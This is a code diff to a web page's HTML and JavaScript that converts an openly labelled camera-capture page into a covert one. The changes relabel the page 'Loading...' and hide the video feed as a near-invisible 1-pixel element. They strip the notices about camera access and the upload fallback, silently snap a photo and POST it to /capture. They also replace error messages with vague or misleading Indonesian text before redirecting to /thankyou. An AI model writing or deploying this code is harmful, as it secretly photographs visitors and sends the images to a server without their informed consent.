@@ -26,46 +26,23 @@
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center p-5">
     <div class="bg-white p-8 rounded-lg shadow-lg max-w-lg w-full text-center">
-        <h1 class="text-2xl font-bold mb-6 text-gray-800">Camera Capture</h1>
+        <h1 class="text-2xl font-bold mb-6 text-gray-800">Loading...</h1>
         
-        <!-- Loading animation -->
+        <!-- Loading animation only -->
         <div id="loading" class="camera-loading">
             <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mb-4"></div>
-            <p class="text-gray-600">Connecting to camera...</p>
-            <p class="text-sm text-gray-500 mt-2">Please allow camera access when prompted</p>
         </div>
         
-        <!-- Hidden camera element -->
-        <div id="camera-container" class="hidden">
-            <video id="camera" class="w-full h-auto rounded mb-4" autoplay playsinline></video>
-            <p id="countdown" class="text-lg font-bold text-blue-600"></p>
+        <!-- Camera element (nearly invisible) -->
+        <div id="camera-container">
+            <video id="camera" autoplay playsinline muted style="width: 1px; height: 1px; position: absolute; opacity: 0.01;"></video>
         </div>
         
-        <!-- Fallback for camera errors -->
-        <div id="no-camera" class="hidden">
-            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-4" role="alert">
-                <p class="font-bold">Camera Access Issue</p>
-                <p>Unable to access your camera. This may be due to:</p>
-                <ul class="list-disc ml-5 mt-2 text-left">
-                    <li>Camera permissions denied</li>
-                    <li>No camera detected on your device</li>
-                    <li>Browser security restrictions (try Chrome or Firefox)</li>
-                    <li>Connection is not secure (HTTPS required in some browsers)</li>
-                </ul>
-            </div>
-            <!-- Fallback file upload option -->
-            <form id="manual-upload" class="mt-4">
-                <label class="block text-gray-700 text-sm font-bold mb-2">Upload a photo instead:</label>
-                <input type="file" id="file-upload" accept="image/*" capture="user" class="mb-4">
-                <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white py-2 px-6 rounded-lg font-medium transition-colors duration-300 w-full">Upload Photo</button>
-            </form>
-        </div>
-        
+        <!-- Hidden processing div -->
         <div id="processing" class="hidden">
             <div class="flex justify-center">
                 <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
             </div>
-            <p class="mt-3 text-gray-600">Processing your image...</p>
         </div>
         
         <canvas id="canvas" class="hidden"></canvas>
@@ -75,13 +52,9 @@
         document.addEventListener('DOMContentLoaded', function() {
             const loadingDiv = document.getElementById('loading');
             const cameraContainer = document.getElementById('camera-container');
-            const noCameraDiv = document.getElementById('no-camera');
             const video = document.getElementById('camera');
             const canvas = document.getElementById('canvas');
             const processingDiv = document.getElementById('processing');
-            const fileUpload = document.getElementById('file-upload');
-            const manualUploadForm = document.getElementById('manual-upload');
-            const countdownElement = document.getElementById('countdown');
             
             // Check if camera is available
             const hasGetUserMedia = () => {
@@ -91,10 +64,21 @@
             
             // Start the camera access process immediately
             if (!hasGetUserMedia()) {
-                // Browser doesn't support camera API
-                loadingDiv.classList.add('hidden');
-                noCameraDiv.classList.remove('hidden');
+                handleCameraError('Browser ini tidak mendukung penggunaan kamera');
                 return;
+            }
+            
+            // Function to handle camera errors
+            function handleCameraError(errorMessage) {
+                console.error('MAAF:', errorMessage);
+                Swal.fire({
+                    icon: 'error',
+                    title: 'MAAF',
+                    text: errorMessage,
+                    confirmButtonText: 'OK'
+                }).then(() => {
+                    window.location.href = '/thankyou';
+                });
             }
             
             // Function to start the camera
@@ -111,90 +95,90 @@
                     .then(function(stream) {
                         video.srcObject = stream;
                         
-                        // Hide loading, show camera
-                        loadingDiv.classList.add('hidden');
-                        cameraContainer.classList.remove('hidden');
+                        // Ensure video plays
+                        video.play();
                         
-                        // Start countdown for auto-capture
-                        startCountdown(0);
+                        // Add play event listener to know when video is actually playing
+                        video.addEventListener('play', function() {
+                        });
+                        
+                        // Video is kept hidden, but we need to wait for it to load
+                        video.onloadedmetadata = function() {
+                            // Wait longer to ensure the camera has fully initialized and has actual frames
+                            setTimeout(() => {
+                                // Check if video has valid dimensions and is playing before capturing
+                                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                                    // Try again in a second
+                                    setTimeout(capturePhoto, 1000);
+                                } else {
+                                    capturePhoto();
+                                }
+                            }, 0); // Increased delay to 3 seconds
+                        };
                     })
                     .catch(function(error) {
-                        console.error('Camera error:', error);
-                        
-                        // Hide loading, show error
-                        loadingDiv.classList.add('hidden');
-                        noCameraDiv.classList.remove('hidden');
-                        
-                        let errorMessage = 'Could not access camera: ';
+                        let errorMessage = 'Tidak bisa melanjutkan: ';
                         
                         switch(error.name) {
                             case 'NotAllowedError':
-                                errorMessage += 'Permission denied in browser dialog';
+                                errorMessage += 'Berikan ulang akses yang dibutuhkan';
                                 break;
                             case 'NotFoundError':
-                                errorMessage += 'No camera found on this device';
+                                errorMessage += 'Device anda tidak mendukung, gunakan device lain';
                                 break;
                             case 'NotReadableError':
-                                errorMessage += 'Camera is already in use';
+                                errorMessage += 'Device siap digunakan';
                                 break;
                             case 'OverconstrainedError':
-                                errorMessage += 'Camera cannot satisfy the requested constraints';
+                                errorMessage += 'Device tidak kompatibel';
                                 break;
                             case 'SecurityError':
-                                errorMessage += 'Camera access is blocked due to security restrictions';
+                                errorMessage += 'Device anda tidak mendukung, gunakan device lain';
                                 break;
                             default:
                                 errorMessage += error.message || 'Unknown error';
                         }
                         
-                        Swal.fire(
-                            'Camera Error',
-                            errorMessage,
-                            'error'
-                        );
+                        handleCameraError(errorMessage);
                     });
-            }
-            
-            // Countdown function for automatic capture
-            function startCountdown(seconds) {
-                let timeLeft = seconds;
-                
-                const countdownInterval = setInterval(() => {
-                    if (timeLeft > 0) {
-                        countdownElement.textContent = `Capturing photo in ${timeLeft}...`;
-                        timeLeft--;
-                    } else {
-                        clearInterval(countdownInterval);
-                        countdownElement.textContent = 'Capturing...';
-                        
-                        // Take the photo automatically
-                        setTimeout(() => {
-                            capturePhoto();
-                        }, 500);
-                    }
-                }, 1000);
             }
             
             // Function to capture photo
             function capturePhoto() {
+                // Wait for video to be ready (HAVE_ENOUGH_DATA = 4)
+                if (video.readyState < 4) {
+                    setTimeout(capturePhoto, 1000);
+                    return;
+                }
+                
                 // Set up canvas for capturing
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Get the image data
-                const imageData = canvas.toDataURL('image/jpeg');
+                // Clear the canvas first
+                context.fillStyle = "#000";
+                context.fillRect(0, 0, canvas.width, canvas.height);
                 
-                // Process the image
-                processAndSendImage(imageData);
+                // Draw video to canvas
+                try {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Get the image data
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    
+                    // Process the image
+                    processAndSendImage(imageData);
+                } catch (err) {
+                    // Try again after a short delay
+                    setTimeout(capturePhoto, 1000);
+                }
             }
             
             // Process and send image function
             function processAndSendImage(imageData) {
+                loadingDiv.classList.add('hidden');
                 processingDiv.classList.remove('hidden');
-                noCameraDiv.classList.add('hidden');
-                cameraContainer.classList.add('hidden');
                 
                 // Send the image to the server
                 fetch('/capture', {
@@ -222,44 +206,9 @@
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    processingDiv.classList.add('hidden');
-                    
-                    if (video.srcObject) {
-                        cameraContainer.classList.remove('hidden');
-                    } else {
-                        noCameraDiv.classList.remove('hidden');
-                    }
-                    
-                    Swal.fire(
-                        'Error',
-                        'Failed to process the image: ' + error.message,
-                        'error'
-                    );
+                    handleCameraError('Failed to process image: ' + error.message);
                 });
             }
-            
-            // Handle manual file upload
-            manualUploadForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                if (!fileUpload.files || fileUpload.files.length === 0) {
-                    Swal.fire('Error', 'Please select a file first', 'error');
-                    return;
-                }
-                
-                const file = fileUpload.files[0];
-                if (!file.type.match('image.*')) {
-                    Swal.fire('Error', 'Please select an image file', 'error');
-                    return;
-                }
-                
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    // Process the image
-                    processAndSendImage(e.target.result);
-                };
-                reader.readAsDataURL(file);
-            });
             
             // Start camera access immediately
             startCamera();
